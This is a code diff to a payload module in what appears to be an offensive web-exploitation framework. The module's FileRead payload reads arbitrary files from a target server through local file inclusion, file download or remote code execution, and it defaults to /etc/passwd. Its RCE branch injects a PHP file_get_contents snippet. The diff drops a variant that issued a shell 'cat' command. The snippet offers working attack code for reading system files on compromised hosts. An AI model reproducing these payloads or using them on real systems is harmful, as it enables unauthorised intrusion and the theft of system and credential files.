@@ -12,7 +12,7 @@ from hwp import Payload
 
 class FileRead(Payload):
     name = "File Read"
-    methods = ["LFI", "FILEDL", "RCE", "RCEs"]
+    methods = ["LFI", "FILEDL", "RCE"]
     description = "Read a local file from the target"
     options = [
         {"name": "file", "default": "/etc/passwd", "help": "File path to read"},
@@ -27,8 +27,6 @@ class FileRead(Payload):
         elif self.method == "RCE":
             safe = filepath.replace("'", "\\'")
             return [f"<?php echo file_get_contents('{safe}'); ?>"]
-        elif self.method == "RCEs":
-            return [f"cat {filepath}"]
 
     def report(self, results):
         for r in results:
